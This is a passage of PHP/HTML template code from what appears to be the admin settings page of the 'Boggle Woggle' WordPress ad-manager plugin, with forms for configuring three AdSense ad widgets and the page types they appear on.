							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_adwidget1_text" id="bw_adwidget1_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_adwidget1_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col" style="background-color: #81DAF5;">
									Ad Widget 2
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_adwidget2_home" id="bw_adwidget2_home" value="true" <?php if (get_option('bw_adwidget2_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget2_home">Home</label><br />

									<input type="checkbox" name="bw_adwidget2_page" id="bw_adwidget2_page" value="true" <?php if (get_option('bw_adwidget2_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget2_page">Page</label><br />

									<input type="checkbox" name="bw_adwidget2_post" id="bw_adwidget2_post" value="true" <?php if (get_option('bw_adwidget2_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget2_post">Post</label><br />

									<input type="checkbox" name="bw_adwidget2_category" id="bw_adwidget2_category" value="true" <?php if (get_option('bw_adwidget2_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget2_category">Category</label><br />

									<input type="checkbox" name="bw_adwidget2_search" id="bw_adwidget2_search" value="true" <?php if (get_option('bw_adwidget2_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget2_search">Search</label><br />

									<input type="checkbox" name="bw_adwidget2_archive" id="bw_adwidget2_archive" value="true" <?php if (get_option('bw_adwidget2_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget2_archive">Archive</label><br />
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_adwidget2_text" id="bw_adwidget2_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_adwidget2_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col" style="background-color: #81DAF5;">
									Ad Widget 3
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="250px">


									<strong style="font-size:11px; font-weight:bold;">Type of content the ad should appear on:</strong><BR>

									<input type="checkbox" name="bw_adwidget3_home" id="bw_adwidget3_home" value="true" <?php if (get_option('bw_adwidget3_home')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget3_home">Home</label><br />

									<input type="checkbox" name="bw_adwidget3_page" id="bw_adwidget3_page" value="true" <?php if (get_option('bw_adwidget3_page')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget3_page">Page</label><br />

									<input type="checkbox" name="bw_adwidget3_post" id="bw_adwidget3_post" value="true" <?php if (get_option('bw_adwidget3_post')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget3_post">Post</label><br />

									<input type="checkbox" name="bw_adwidget3_category" id="bw_adwidget3_category" value="true" <?php if (get_option('bw_adwidget3_category')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget3_category">Category</label><br />

									<input type="checkbox" name="bw_adwidget3_search" id="bw_adwidget3_search" value="true" <?php if (get_option('bw_adwidget3_search')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget3_search">Search</label><br />

									<input type="checkbox" name="bw_adwidget3_archive" id="bw_adwidget3_archive" value="true" <?php if (get_option('bw_adwidget3_archive')=='true') echo ' checked="checked" ' ?> /> <label for="bw_adwidget3_archive">Archive</label><br />
									<BR>
							</td>
							<td width="350px">
							<strong style="font-size:11px; font-weight:bold;">Enter/Paste Google Adsense code:</strong><BR>

							<textarea name="bw_adwidget3_text" id="bw_adwidget3_text" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('bw_adwidget3_text'); ?></textarea>
							</td>
						</tr>


											</tbody></table>


<input type="hidden" name="action" value="update" />
<input type="hidden" name="page_options" value="bw_global_excludelist, bw_addunit1_home, bw_addunit1_page, bw_addunit1_text, bw_addunit1_post, bw_addunit1_category, bw_addunit1_search, bw_addunit1_archive, bw_addunit1_location, bw_addunit1_alignment, bw_addunit2_home, bw_addunit2_page, bw_addunit2_text, bw_addunit2_post, bw_addunit2_category, bw_addunit2_search, bw_addunit2_archive, bw_addunit2_location, bw_addunit2_alignment, bw_addunit3_home, bw_addunit3_page, bw_addunit3_text, bw_addunit3_post, bw_addunit3_category, bw_addunit3_search, bw_addunit3_archive, bw_addunit3_location, bw_addunit3_alignment, bw_addunit4_home, bw_addunit4_page, bw_addunit4_text, bw_addunit4_post, bw_addunit4_category, bw_addunit4_search, bw_addunit4_archive, bw_addunit4_location, bw_addunit4_alignment, bw_addunit5_home, bw_addunit5_page, bw_addunit5_text, bw_addunit5_post, bw_addunit5_category, bw_addunit5_search, bw_addunit5_archive, bw_addunit5_location, bw_addunit5_alignment, bw_addunit6_home, bw_addunit6_page, bw_addunit6_text, bw_addunit6_post, bw_addunit6_category, bw_addunit6_search, bw_addunit6_archive, bw_addunit6_location, bw_addunit6_alignment, bw_addunit7_home, bw_addunit7_page, bw_addunit7_text, bw_addunit7_post, bw_addunit7_category, bw_addunit7_search, bw_addunit7_archive, bw_addunit7_location, bw_addunit7_alignment, bw_addunit8_home, bw_addunit8_page, bw_addunit8_text, bw_addunit8_post, bw_addunit8_category, bw_addunit8_search, bw_addunit8_archive, bw_addunit8_location, bw_addunit8_alignment, bw_addunit9_home, bw_addunit9_page, bw_addunit9_text, bw_addunit9_post, bw_addunit9_category, bw_addunit9_search, bw_addunit9_archive, bw_addunit9_location, bw_addunit9_alignment, bw_adwidget1_home, bw_adwidget1_page, bw_adwidget1_post, bw_adwidget1_category, bw_adwidget1_search, bw_adwidget1_archive, bw_adwidget1_text, bw_adwidget2_home, bw_adwidget2_page, bw_adwidget2_post, bw_adwidget2_category, bw_adwidget2_search, bw_adwidget2_archive, bw_adwidget2_text, bw_adwidget3_home, bw_adwidget3_page, bw_adwidget3_post, bw_adwidget3_category, bw_adwidget3_search, bw_adwidget3_archive, bw_adwidget3_text" />

<p>
<input type="submit" value="<?php _e('Save Changes') ?>" />
</p>

</form>
</div>

			<div style="float:left">




				<table class="widefat" cellspacing="0" style="width:350px; margin-left:15px;">

					<tbody>
						<thead>
							<tr>
								<th colspan="2" scope="col">
									Visual representation of the available locations:
								</th>
							</tr>
						</thead>

							<tr>
								<td width="350px">
									<a href="<?php bloginfo( 'wpurl' ); ?>
/wp-content/plugins/boggle-woggle/Plugin-Arrows.png" target="_blank"><img src="<?php bloginfo( 'wpurl' ); ?>
/wp-content/plugins/boggle-woggle/Plugin-Arrows.png" width="300px"></a><BR>
								<center>CLICK TO ENLARGE</center>
								</td>
							</tr>

					</tbody>
				</table>
<BR><BR>
				<table class="widefat" cellspacing="0" style="width:350px; margin-left:15px;">

					<tbody>
						<thead>
							<tr>
								<th colspan="2" scope="col">
									News & Info
								</th>
							</tr>
						</thead>

							<tr>
								<td width="350px">
									For more information and requesting features or any other questions, please visit the official website:<BR>
									<a href="http://www.shops2b.co.uk/boggle-woggle-wordpress-ad-manager/">Boggle Woggle</a><BR<BR>
									I would really appreciate it if you gave me some feedback there. I have had no feedback yet and am not sure if you like the plugin or if I should change some things.

								</td>
							</tr>

					</tbody>
				</table>
			</div>
</div>



<BR><BR>
<?php
}
?>